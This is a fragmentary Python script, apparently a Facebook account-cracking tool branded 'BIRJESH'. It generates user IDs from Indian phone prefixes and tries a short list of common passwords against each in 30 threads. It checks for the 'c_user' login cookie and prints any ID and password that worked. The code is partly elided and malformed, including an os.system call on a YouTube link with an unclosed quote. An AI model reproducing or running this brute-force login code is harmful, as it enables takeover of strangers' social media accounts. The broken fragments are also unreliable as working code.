...
os.system("https://youtube.com/@birjeshkumar.Bihari?si=8ZLBG6O2EsugZPFy)
#app  check 


logo =("""
d8888b. d888888b d8888b.    d88b d88888b .d8888. db   db      
88  `8D   `88'   88  `8D    `8P' 88'     88'  YP 88   88      
88oooY'    88    88oobY'     88  88ooooo `8bo.   88ooo88      
88~~~b.    88    88`8b       88  88~~~~~   `Y8b. 88~~~88      
88   8D   .88.   88 `88. db. 88  88.     db   8D 88   88      
Y8888P' Y888888P 88   YD Y8888P  Y88888P `8888Y' YP   YP      
                                                              
                                                              
8D' Y88888P Y88888P 8        𝐁𝐑𝐀𝐍𝐃
\033[1;37m═══════════════════════════════════════════════
\033[1;32m[•]𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 :»  𝐎WNER BIRJESH
\033[1;37m[•]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   :»  BIRJESH
\033[1;32m[•]𝐆𝐈𝐓𝐇𝐔𝐁     :»  BIRJESH-840
\033[1;37m[•]𝐁𝐑𝐎𝐓𝐇𝐄𝐑    :»  KARAN
\033[1;32m[•]𝐓𝐎𝐎𝐋       :»  𝐅𝐑𝐄𝐄
\033[1;37m═══════════════════════════════════════════════\n""")
loop = 0
oks = []
...
rm -rf LOL2 
git clone https://github.com/SK-BAAP-786/Birjesh840.git
...
def random_number():
	...
	os.system('clear')
	print(logo)
	print("\033[1;32m INDIA code : 6353,9871,6383,9725,6355")
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [kode+guru,'57273200','57575751','59039200','57273200','57575751','mk']
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[BIRJESH-OK] '+uid+' | '+ps)
		...
		sys.stdout.write('\r\33[1;37m[BIRJESH] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
